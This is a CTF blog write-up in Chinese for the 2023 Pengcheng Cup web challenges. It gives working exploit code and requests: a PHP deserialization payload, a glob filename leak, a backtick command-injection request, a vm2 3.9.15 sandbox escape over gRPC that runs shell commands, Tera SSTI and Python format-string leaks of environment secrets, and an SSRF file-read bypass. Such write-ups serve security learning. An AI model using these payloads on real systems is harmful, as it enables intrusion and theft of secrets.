---
title: "2023 鹏城杯 Web Writeup"
date: 2023-11-04T20:53:42+08:00
lastmod: 2023-11-04T20:53:42+08:00
draft: false
author: "X1r0z"

tags: ['ctf']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

2023 鹏城杯 Web Writeup

<!--more-->

## web1

简单反序列化

```php
<?php

class Hacker {
}

class H {
    public $username;
}

$b = new Hacker();

$a = new H();
$a->username = $b;

echo serialize($a);
?>
```

```http
POST / HTTP/1.1
Host: 172.10.0.6
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 48

pop=O:1:"H":1:{s:8:"username";O:6:"Hacker":0:{}}
```

## web2

filename 会传入 scandir 函数, 当目录存在时返回 yes 否则返回 no

通过 glob 协议 leak backdoor filename

```python
import requests

dicts = '0123456789abcdef'
flag = ''

i = 1

while True:
    for s in dicts:
        print('testing', s)
        url = 'http://172.10.0.5/'
        res = requests.post(url, data={
            'filename': 'glob:///var/www/html/backdoor_*' + flag + s + '*',
        })
        if 'yesyesyes!!!' in res.text:
            flag += s
            print('found!!!', flag)
            break
    i += 1
```

`backdoor_[a-f0-9]{16}.php`

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

if(isset($_GET['username'])){
    $sandbox = '/var/www/html/sandbox/'.md5("5050f6511ffb64e1914be4ca8b9d585c".$_GET['username']).'/';
    mkdir($sandbox);
    chdir($sandbox);
    
    if(isset($_GET['title'])&&isset($_GET['data'])){
        $data = $_GET['data'];
        $title= $_GET['title'];
        if (strlen($data)>5||strlen($title)>3){
            die("no!no!no!");
        }
        file_put_contents($sandbox.$title,$data);

        if (strlen(file_get_contents($title)) <= 10) {
            system('php '.$sandbox.$title);
        }
        else{
            system('rm '.$sandbox.$title);
            die("no!no!no!");
        }

    }
    else if (isset($_GET['reset'])) {
        system('/bin/rm -rf ' . $sandbox);
    }
}
?>
```

构造数组绕过长度限制, 直接执行命令查看 flag

```http
GET /backdoor_00fbc51dcdf9eef767597fd26119a894.php?username=exp10it&title[]=123&data[]=<?=`nl+/*`; HTTP/1.1
Host: 172.10.0.5
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://172.10.0.5
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://172.10.0.5/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close

```

## simple_rpc

less import inline 语法读文件, 参考 P 师傅 Flarum RCE

```
/find_rpc?less=h5{@import%20(inline)%20'rpc.js';}
/find_rpc?less=h5{@import%20(inline)%20'eval.proto';}
/find_rpc?less=h5{@import%20(inline)%20'app.js';}
/find_rpc?less=h5{@import%20(inline)%20'package.json';}
```

rpc.js

```javascript
var PROTO_PATH = __dirname + '/eval.proto';
const {VM} = require("vm2");
var grpc = require('@grpc/grpc-js');
var protoLoader = require('@grpc/proto-loader');
var packageDefinition = protoLoader.loadSync(
    PROTO_PATH,
    {keepCase: true,
        longs: String,
        enums: String,
        defaults: true,
        oneofs: true
    });
var hello_proto = grpc.loadPackageDefinition(packageDefinition).helloworld;

function evalTemplate(call, callback) {
    const vm = new VM();
    callback(null, {message:    vm.run(call.request.template) });
}

function main() {
    var server = new grpc.Server();
    server.addService(hello_proto.Demo.service, {evalTemplate: evalTemplate});
    server.bindAsync('0.0.0.0:8082', grpc.ServerCredentials.createInsecure(), () => {
        server.start();
    });
}

main()
```

eval.proto

```protobuf
syntax = "proto3";

package helloworld;

service Demo {
  rpc evalTemplate (TemplateRequest) returns (Reply) {}
}

message TemplateRequest {
  string template = 1;
}

message Reply {
  string message = 1;
}
```

package.json 中 vm2 版本为 3.9.15

构造 grpc client 打 vm2 沙箱逃逸

[https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c](https://gist.github.com/leesh3288/f05730165799bf56d70391f3d9ea187c)

```javascript
const grpc = require('@grpc/grpc-js');
const protoLoader = require('@grpc/proto-loader');

const packageDefinition = protoLoader.loadSync(
  'eval.proto',
  {
    keepCase: true,
    longs: String,
    enums: String,
    defaults: true,
    oneofs: true
  }
);

const protoDescriptor = grpc.loadPackageDefinition(packageDefinition);

const client = new protoDescriptor.helloworld.Demo(
  '172.10.0.6:8082',
  grpc.credentials.createInsecure()
);

const code = `
aVM2_INTERNAL_TMPNAME = {};
function stack() {
    new Error().stack;
    stack();
}
try {
    stack();
} catch (a$tmpname) {
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('/readflag').toString();
}
`;

client.evalTemplate({ template: code }, (error, response) => {
    if (error) {
      console.error(error);
      return;
    }
    console.log(response);
});
```

## Tera

Tera ssti

[https://keats.github.io/tera/docs/](https://keats.github.io/tera/docs/)

Flag 猜测在环境变量里面

通过 get_env + if starting_with / ending_with leak flag

```python
import requests

dicts = '0123456789abcdef-'
# flag = '{3c8ce067-4df7-66b2-843a-04c6959'
flag = '-04c695904159}'

i = 1

while True:
    for s in dicts:
        print('testing', s)
        url = 'http://172.10.0.3:8081/'
        # data = r'{% set my_var = get_env(name="flac"|replace(from="c", to="g")) %}{% if my_var is starting_with("AAAg' + flag + s + '"|replace(from="AAA", to="fla")) %}true{% else %}false{% endif %}'
        data = r'{% set my_var = get_env(name="flac"|replace(from="c", to="g")) %}{% if my_var is ending_with("' + s + flag + '") %}true{% else %}false{% endif %}'
        # print(data)
        res = requests.post(url, data=data)
        if 'forbidden' in res.text:
            print('forbidden')
            exit()
        if 'true' in res.text:
            # flag += s
            flag = s + flag
            print('found!!!', flag)
            break
    i += 1
```

## Escape

/source

```python
from sqlite3 import *

from random import choice
from hashlib import sha512

from flask import Flask, request, Response

app = Flask(__name__)

salt = b'****************'

class PassHash(str):
    def __str__(self):
        return sha512(salt + self.encode()).hexdigest()

    def __repr__(self):
        return sha512(salt + self.encode()).hexdigest()

con = connect("users.db")
cur = con.cursor()
cur.execute("DROP TABLE IF EXISTS users")
cur.execute("CREATE TABLE users(username, passhash)")
passhash = PassHash(''.join(choice("0123456789") for _ in range(16)))
cur.execute(
    "INSERT INTO users VALUES (?, ?)",
    ("admin", str(passhash))
)
con.commit()

@app.route('/source')
def source():
    return Response(open(__file__).read(), mimetype="text/plain")

@app.route('/')
def index():
    if 'username' not in request.args or 'password' not in request.args:
        return open("index.html").read()
    else:
        username = request.args["username"]
        new_pwd = PassHash(request.args["password"])
        con = connect("users.db")
        cur = con.cursor()
        res = cur.execute(
            "SELECT * from users WHERE username = ? AND passhash = ?",
            (username, str(new_pwd))
        )
        if res.fetchone():
            return open("secret.html").read()
        return ("Sorry, we couldn't find a user '{user}' with password hash <code>{{passhash}}</code>!"
                .format(user=username)
                .format(passhash=new_pwd)
                )

if __name__ == "__main__":
    app.run('0.0.0.0', 10000)
```

两次 format, 存在 Python 格式化字符串漏洞

获取 global 中的 passhash

```
/?username={passhash.__str__.__globals__[passhash]:>0}&password=2
```

PassHash 虽然继承了 str, 但是只重写了 `__str__` 和 `__repr__` 两个方法, 实例化时传入的 password 明文其实还保存在对象里面

比如 `passhash.lower()` 依然显示的是原来的值

`:>0` 表示左对齐, 会调用父类 str 的 `__format__` 方法, 而不是 `__str__` 和 `__repr__`, 进而得到明文

然后传入

```
/?username=admin&password=3673940420288307
```

提示 flag 在环境变量里面

于是通过 flask app 找到 os 模块, 然后读取 environ 属性

```
/?username={passhash.__str__.__globals__[app].__init__.__globals__[os].environ}&password=2
```

## HTTP

Swagger UI 泄露

[http://172.10.0.3:8080/swagger-ui/](http://172.10.0.3:8080/swagger-ui/)

/proxy/url 存在 ssrf, 过滤了 `file://` `netdoc://` 等协议

使用 `url:file://` 绕过, 再传一个 query string 绕过 `Only html can be viewed` 限制

```
/proxy/url?url=url:file:///flag?html
```